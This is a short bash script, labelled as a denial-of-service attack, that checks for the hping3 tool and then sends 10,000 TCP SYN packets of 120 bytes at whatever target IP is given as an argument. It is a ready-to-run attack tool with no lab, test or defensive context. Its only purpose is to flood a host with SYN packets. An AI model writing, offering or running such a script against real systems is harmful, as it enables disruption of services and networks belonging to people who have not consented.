#!/bin/bash
# hping3 - Denial of Service Attack
# Options:
# -c : Packet count
# -d : Packet size
# -S : TCP SYN flag

# Usage: hping3.sh <target_ip>
# Example script
# hping3.sh 192.168.1.1

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null
then
    echo "hping3 could not be found, please install it first."
    exit
fi

# Ensure target IP is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

TARGET_IP=$1

echo "Starting hping3 DoS attack on $TARGET_IP"

# Perform DoS attack
hping3 -c 10000 -d 120 -S $TARGET_IP

echo "hping3 DoS attack completed."
